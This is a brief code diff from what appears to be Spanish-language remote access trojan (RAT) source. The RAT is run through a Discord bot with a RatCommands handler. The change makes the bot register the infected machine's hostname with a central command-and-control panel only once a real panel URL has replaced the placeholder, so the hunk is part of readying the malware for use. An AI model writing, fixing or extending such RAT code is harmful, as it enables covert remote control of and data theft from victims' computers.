@@ -56,7 +56,7 @@ rat = RatCommands()
 @bot.event
 async def on_ready():
     print(f"[RAT] Conectado como {bot.user}")
-    if PANEL_URL:
+    if PANEL_URL and PANEL_URL != "PANEL_URL_PLACEHOLDER":
         try:
             from central_client import CentralClient
             client = CentralClient(PANEL_URL, platform.node())
